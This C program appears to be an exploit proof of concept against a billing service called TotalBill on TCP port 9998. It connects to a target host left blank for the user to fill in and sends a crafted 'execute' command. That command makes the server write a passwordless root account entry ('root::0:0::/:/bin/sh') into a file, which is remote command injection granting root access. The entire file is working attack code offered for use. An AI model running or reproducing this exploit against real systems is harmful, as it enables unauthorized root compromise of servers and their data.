#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define TOTALBILL_PORT		9998
#define TOTALBILL_SERVER	""	/* Insert hostname here */

int main (void) 
{
  struct sockaddr_in servaddr;
  char *tempstr, buf[8192];
  struct hostent *host;
  int sockfd;
   
  if ((sockfd = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) 
    {
      fprintf (stderr, "Error: Could not create a socket: %s\n", 
               strerror (errno));
      return (1);
    }
  memset (&servaddr, 0, sizeof (servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons (TOTALBILL_PORT);

  if ((host = gethostbyname (TOTALBILL_SERVER)) == NULL) 
    {
      fprintf (stderr, "Error: Could not look up %s\n", TOTALBILL_SERVER);
      return (1);
    }

  memcpy (&servaddr.sin_addr, host->h_addr_list[0], host->h_length);
  if (connect (sockfd, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0) 
    {
      fprintf (stderr, "Error: Cannot connect to %s: %s\n", TOTALBILL_SERVER, 
               strerror (errno));
      return (1);
    }
  tempstr = "123456  execute  execute  execute=/bin/echo+root::0:0::/:/bin/sh+>+/rootfile";
  printf ("Sending command %s to %s\n", tempstr, TOTALBILL_SERVER);
  if (write (sockfd, tempstr, strlen (tempstr) + 1) < 0) 
    {
      fprintf (stderr, "Error: Cannot write to socket: %s\n", strerror (errno));
      return (1);
    }
  printf ("Sent...waiting for response...\n");
  if (read (sockfd, buf, sizeof (buf)) < 0) 
    {
      fprintf (stderr, "Error: Cannot read from socket: %s\n", strerror (errno));
      return (1);
    }
  printf ("Received %s from server\n", buf);
  close (sockfd);
  return (0);
}

